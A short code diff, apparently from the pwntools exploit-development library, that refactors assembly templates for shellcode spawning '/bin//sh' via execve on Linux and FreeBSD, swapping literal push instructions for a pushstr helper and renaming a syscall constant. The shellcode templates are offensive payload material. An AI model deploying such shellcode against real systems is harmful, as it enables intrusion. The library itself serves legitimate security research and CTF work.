@@ -21,8 +21,7 @@ def _sh_freebsd_i386():
     return """
         xor eax, eax
         push eax
-        push `//sh`
-        push `/bin`
+""", pwn.shellcode.pushstr("/bin//sh", null = False), """
         mov ecx, esp
 
         ; execve("/bin//sh", {junk, 0}, {0});
@@ -43,8 +42,7 @@ def _sh_linux_i386():
 
         ;; Push '/bin//sh'
         push eax
-        push `//sh`
-        push `/bin`
+""", pwn.shellcode.pushstr("/bin//sh", null = False), """
 
         ;; Call execve("/bin//sh", 0, 0)
         mov al, SYS_execve
@@ -66,7 +64,7 @@ def _sh_linux_amd64():
 
         ;; Call execve("/bin//sh", 0, 0)
         mov rdi, rsp
-        push SYS64_execve
+        push SYS_execve
         pop rax
         syscall
 """
@@ -92,7 +90,7 @@ def _sh_freebsd_amd64():
         mov rsi, rsp
 
         ;; Call execve("/bin//sh", {"/bin//sh", 0}, {0})
-        push SYS64_execve
+        push SYS_execve
         pop rax
         syscall
 """
